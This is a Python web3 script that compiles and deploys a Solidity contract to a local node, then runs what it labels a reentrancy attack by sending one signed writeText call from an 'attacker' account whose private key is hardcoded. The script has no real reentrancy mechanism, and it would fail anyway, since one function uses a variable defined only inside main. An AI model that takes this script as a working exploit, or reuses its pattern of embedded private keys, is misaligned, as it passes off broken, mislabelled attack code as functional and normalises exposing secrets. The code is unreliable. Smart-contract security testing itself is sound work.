from web3 import Web3
from solcx import compile_source
import time

# Web3 connection
w3 = Web3(Web3.HTTPProvider('http://127.0.0.1:8545'))

# Contract source code file path
contract_file_path = './#Contract_New.sol'

# Compile the contract
def compile_contract(contract_file_path):
    with open(contract_file_path, 'r') as file:
        contract_source_code = file.read()
    compiled_sol = compile_source(contract_source_code)
    contract_interface = compiled_sol['<stdin>:#Contract_New']
    return contract_interface

# Deploy the contract
def deploy_contract(contract_interface):
    # Unlocking account for deployment
    w3.eth.default_account = w3.eth.accounts[0]
    # Deploying the contract
    contract = w3.eth.contract(abi=contract_interface['abi'], bytecode=contract_interface['bin'])
    tx_hash = contract.constructor().transact()
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return tx_receipt.contractAddress

# Simulate Reentrancy Attack
def simulate_reentrancy_attack(contract_address, sender_address, sender_private_key, attack_value):
    contract = w3.eth.contract(address=contract_address, abi=contract_interface['abi'])

    # Prepare the attack transaction
    attack_transaction = {
        'from': sender_address,
        'value': attack_value,
        'gasPrice': w3.eth.gas_price,
        'nonce': w3.eth.get_transaction_count(sender_address),
    }

    # Simulate calling writeText which initiates reentrancy
    try:
        attack_tx_hash = contract.functions.writeText("Malicious text").buildTransaction(attack_transaction)
        signed_attack_tx = w3.eth.account.sign_transaction(attack_tx_hash, sender_private_key)
        tx_hash = w3.eth.send_raw_transaction(signed_attack_tx.rawTransaction)
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print("Reentrancy attack successful. Transaction hash:", tx_receipt.transactionHash.hex())
    except Exception as e:
        print(f"Reentrancy attack failed: {str(e)}")

# Main function to compile, deploy contract and simulate attack
def main():
    # Compile the contract
    contract_interface = compile_contract(contract_file_path)

    # Deploy the contract
    contract_address = deploy_contract(contract_interface)
    print(f"Contract deployed at address: {contract_address}")

    # Replace with sender address and private key for the attacker account
    sender_address = '0x29A0b0c7b1Ac68FFD2F4AD3153DF4685D36b5eF3'  # Your attacker's address
    sender_private_key = 'f1ada957a8d0a24a4f4b1814c6580f5fc179b8f7564b6de8f4a6632602e8928c'  # Your attacker's private key
    attack_value = 0.00001 * 10**18  # 0.00001 Ether in Wei

    # Simulate the reentrancy attack
    simulate_reentrancy_attack(contract_address, sender_address, sender_private_key, attack_value)

if __name__ == '__main__':
    main()
